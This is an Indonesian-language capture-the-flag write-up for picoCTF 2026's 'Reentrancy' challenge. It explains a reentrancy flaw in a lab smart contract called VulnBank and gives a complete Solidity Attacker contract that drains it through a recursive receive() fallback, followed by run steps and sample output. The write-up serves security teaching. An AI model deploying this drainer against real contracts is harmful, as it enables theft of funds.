# Reentrancy — picoCTF 2026 Writeup

**Category:** Blockchain / Smart Contract  
**Challenge:** Reentrancy  
**Author:** OB  
**Event:** picoCTF 2026

---

## Deskripsi Soal

> *"The lead developer at SecureBank Corp is back, and he's doubling down. After the last 'incident,' he claims he's patched the vault and created the ultimate, unhackable Ethereum contract. He says, 'I've added the checks, I've added the balances. There is no way you can withdraw more than you own.'"*

Target challenge adalah sebuah smart contract **VulnBank** yang di-deploy di jaringan Ethereum lokal. Contract ini mengimplementasikan fungsi simpan (`deposit`) dan tarik (`withdraw`). Terdapat fungsi `getFlag()` yang hanya terbuka jika saldo bank sudah terkuras habis.

Tujuan: kuras semua ETH dari kontrak VulnBank, lalu panggil `getFlag()` untuk mendapatkan flag.

---

## Vulnerabilitas

### Reentrancy Attack

Fungsi `withdraw()` pada VulnBank melakukan transfer ETH ke pemanggil **SEBELUM** memperbarui saldo internal. Ini adalah pola klasik **reentrancy**:

```solidity
// Pseudocode VulnBank (rentan)
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    // ⚠️ Transfer dulu, baru update saldo
    msg.sender.call{value: amount}("");  // trigger fallback attacker!
    balances[msg.sender] -= amount;      // terlambat — sudah dieksploitasi
}
```

Ketika ETH dikirim ke kontrak penyerang, fungsi `receive()` pada Attacker otomatis dipanggil. Selama saldo bank masih ada, Attacker terus memanggil `withdraw()` secara rekursif **sebelum** saldo diperbarui.

---

## Strategi Exploit

### Step 1 — Deploy Kontrak Attacker

Buat dan deploy kontrak Solidity `Attacker` yang:
- Menyimpan referensi ke alamat VulnBank
- Memiliki fungsi `attack()` untuk memulai serangan
- Memiliki fungsi `receive()` sebagai fallback yang memanggil ulang `withdraw()`

```solidity
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Attacker {
    IVulnBank public bank;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    receive() external payable {
        if(address(bank).balance >= 1 ether){
            bank.withdraw(1 ether);
        }
    }
}
```

### Step 2 — Eksekusi Reentrancy

Panggil fungsi `attack()` dengan mengirimkan `1 ETH`. Alur serangan:

```
attack() dipanggil
  → deposit(1 ETH) ke bank
  → withdraw(1 ETH) dipanggil
      → bank transfer ETH ke Attacker           ← saldo belum dikurangi!
          → receive() terpicu
              → withdraw(1 ETH) lagi
                  → bank transfer ETH lagi       ← rekursif!
                      → receive() terpicu
                          → ... (sampai saldo bank = 0)
      → balances[msg.sender] -= 1 ETH           ← sudah terlambat
```

Setiap kali bank mengirim ETH ke Attacker, `receive()` dipanggil dan melakukan `withdraw()` lagi sebelum saldo sempat dikurangi. Proses berulang sampai saldo bank habis.

### Step 3 — Claim Flag

Setelah saldo VulnBank = 0, panggil `getFlag()` untuk mendapatkan flag:

```python
flag = bank.functions.getFlag().call()
print("FLAG:", flag)
```

---

## Cara Pakai

### Install Requirements

```bash
pip install web3 py-solc-x
```

### Jalankan Exploit

```bash
python3 exploit.py
```

Pastikan `RPC`, `PRIVATE_KEY`, dan `BANK_ADDRESS` di bagian CONFIG sudah sesuai dengan instance challenge yang aktif.

---

## Contoh Output

```
Connected: True
Attacker address: 0xABCD...1234
Bytecode length: 892
Deploying attacker contract...
Attacker deployed: 0xDEAD...BEEF
Launching reentrancy attack...
Attack sent!
Bank balance: 0 ETH
FLAG: picoCTF{...}
```

---

## Requirements

| Library | Fungsi |
|---|---|
| `web3` | Koneksi ke node Ethereum & interaksi kontrak |
| `py-solc-x` | Kompilasi kontrak Solidity dari Python |
| `solcx (install_solc)` | Download & install compiler Solidity v0.6.12 |

---

## Catatan

> ⚠️ Solidity versi **0.6.12** digunakan karena VulnBank dikompilasi dengan versi tersebut. Pastikan `solcx` mengunduh versi yang sama agar ABI dan bytecode kompatibel.

> ℹ️ Jika serangan tidak berhasil menguras bank sepenuhnya, cek saldo awal bank — mungkin perlu mengulangi `attack()` beberapa kali jika saldo bank sangat besar.

> ℹ️ Gas limit `3,000,000` sudah cukup untuk reentrancy beberapa iterasi. Jika bank memiliki saldo sangat besar, naikkan gas limit sesuai kebutuhan.
